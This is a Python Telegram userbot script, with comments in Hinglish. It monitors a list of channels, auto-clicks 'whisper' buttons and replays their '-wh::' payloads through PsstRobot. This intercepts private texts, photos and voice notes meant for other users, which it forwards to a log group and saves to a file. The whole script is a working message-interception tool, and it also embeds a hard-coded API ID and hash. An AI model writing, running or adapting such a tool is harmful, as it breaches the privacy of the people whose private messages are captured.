import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"

# String session Render ke Environment Variable se lega
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee",
    -1002133821583,
    "its_diyaa",
    -1004469467503,
    "UnhingedAspirand",
    -1003954728685,
    "channelizpublick",
    -1004303326817,
    "fewmehh",
    -1004466801780,
]

LOG_GROUP_ID = -1004402300724
DATA_FILE = "data.txt"

if not SESSION_STRING:
    print("❌ ERROR: SESSION_STRING Environment Variable nahi mila!")
    sys.exit(1)

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)


# ==================== ADVANCED WHISPER HANDLER ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def whisper_handler(event):
    start_time = time.perf_counter()

    # Auto-Seen Channel Message
    try:
        asyncio.create_task(
            client.send_read_acknowledge(event.chat_id, max_id=event.id)
        )
    except Exception:
        pass

    if not event.buttons:
        return

    chat_name = event.chat.title if event.chat else "Target Channel"
    print(
        f"\n⚡ [{datetime.now().strftime('%H:%M:%S')}] Whisper Packet Received: [{chat_name}]"
    )

    try:
        # Link Generation
        chat = await event.get_chat()
        if getattr(chat, "username", None):
            msg_link = f"https://t.me/{chat.username}/{event.id}"
            channel_link = f"https://t.me/{chat.username}"
        else:
            clean_id = str(event.chat_id).replace("-100", "")
            msg_link = f"https://t.me/c/{clean_id}/{event.id}"
            channel_link = f"Private ID: {event.chat_id}"

        payload = None

        # STEP 1: Check Karo Kya Button me Inline Query Payload (-wh::...) hai?
        for row in event.buttons:
            for btn in row:
                # Check switch_inline query
                if (
                    hasattr(btn.button, "query")
                    and btn.button.query
                    and "-wh::" in btn.button.query
                ):
                    payload = btn.button.query
                    break
                # Check URL button
                elif (
                    hasattr(btn.button, "url")
                    and btn.button.url
                    and "-wh::" in btn.button.url
                ):
                    match = re.search(r"(-wh::[^\s&]+)", btn.button.url)
                    if match:
                        payload = match.group(1)
                        break

        # STEP 2: Agar Advanced Whisper Payload Mil Gaya (Image / VN / Video)
        if payload:
            print(f"🔍 Advanced Whisper Payload Detected: {payload}")
            try:
                # PsstRobot par inline query chalao
                results = await client.inline_query("PsstRobot", payload)
                if results:
                    # Direct aapke Group me Photo/VN/Media post (click) kar dega!
                    await results[0].click(LOG_GROUP_ID)

                    elapsed_ms = round(
                        (time.perf_counter() - start_time) * 1000, 2
                    )
                    current_time = datetime.now().strftime("[%d-%m-%Y %H:%M:%S]")

                    log_msg = (
                        f"🔓 **Advanced Whisper Decoded (Photo/VN/Media)!**\n"
                        f"📍 **Channel:** {chat_name}\n"
                        f"⚡ **Speed:** `{elapsed_ms} ms`\n"
                        f"🔗 [Message Link]({msg_link})"
                    )
                    await client.send_message(LOG_GROUP_ID, log_msg)

                    print(
                        f"🎉 SUCCESS! Advanced Media Whisper Group Me Bhej Diya in {elapsed_ms}ms!"
                    )

                    # Save to data.txt
                    file_entry = (
                        f"{current_time} CHANNEL: {chat_name}\n"
                        f"Type: Advanced Whisper (Media/VN)\n"
                        f"Message Link: {msg_link}\n"
                        f"Payload: {payload}\n"
                        f"{'-'*60}\n"
                    )
                    with open(DATA_FILE, "a", encoding="utf-8") as f:
                        f.write(file_entry)
                    return
            except Exception as e:
                print(f"❌ Inline Query Error: {e}")

        # STEP 3: Fallback - Normal Text Popup Whisper
        secret_text = None
        try:
            response = await event.click(0)
            if hasattr(response, "message") and response.message:
                secret_text = response.message
            elif isinstance(response, str):
                secret_text = response
        except Exception:
            pass

        # Check popup response for payload
        if secret_text and "-wh::" in secret_text:
            match = re.search(r"(-wh::[^\s&]+)", secret_text)
            if match:
                payload = match.group(1)
                results = await client.inline_query("PsstRobot", payload)
                if results:
                    await results[0].click(LOG_GROUP_ID)
                    print(
                        "🎉 SUCCESS! Advanced Whisper Media Sent via Popup Payload!"
                    )
                    return

        if secret_text and "advanced whisper" not in secret_text.lower():
            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
            current_time = datetime.now().strftime("[%d-%m-%Y %H:%M:%S]")

            file_entry = (
                f"{current_time} CHANNEL: {chat_name}\n"
                f"Channel Link: {channel_link}\n"
                f"Message Link: {msg_link}\n"
                f"Execution Time: {elapsed_ms}ms\n"
                f"Secret Message: {secret_text}\n"
                f"{'-'*60}\n"
            )
            with open(DATA_FILE, "a", encoding="utf-8") as f:
                f.write(file_entry)

            log_payload = (
                f"🔓 **Whisper Intercepted (Text)!**\n\n"
                f"📝 **Secret Message:**\n`{secret_text}`\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** `{elapsed_ms} ms`\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log_payload)
            print(
                f"✅ Text Decoded & Sent in {elapsed_ms}ms! 👉 {secret_text}"
            )
        else:
            print("⚠️ Secret message read nahi ho paya ya access restricted tha.")

    except FloodWaitError as e:
        print(f"⚠️ Telegram FloodWait: Sleeping for {e.seconds}s...")
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"❌ Execution Error: {e}")
        traceback.print_exc()


# ==================== WEB SERVER (FOR UPTIMEROBOT) ====================
async def handle_ping(request):
    return web.Response(text="Bot is Running 24/7 Active!")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"🌐 Web Server started on Port {port}")


# ==================== STARTUP SEQUENCE ====================
async def main():
    print("==================================================")
    print("🚀 PRO WHISPER AUTOMATOR (Inline Media + VN Support)")
    print("==================================================")

    await client.start()
    print("🔄 Telegram Connection Established via StringSession!")

    await start_web_server()
    await client.get_dialogs()

    try:
        await client.send_message(
            LOG_GROUP_ID,
            "🚀 **Whisper Automator (Text + Image + Voice Note Engine) Active!**",
        )
        print(f"🟢 Log Group Verified: {LOG_GROUP_ID}")
    except Exception as e:
        print(f"🔴 Log Group Warning: {e}")

    print("==================================================")
    print("🔥 Bot 24/7 Active! Normal Text, Photos aur Voice Notes sab aayenge.")
    print("==================================================\n")

    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
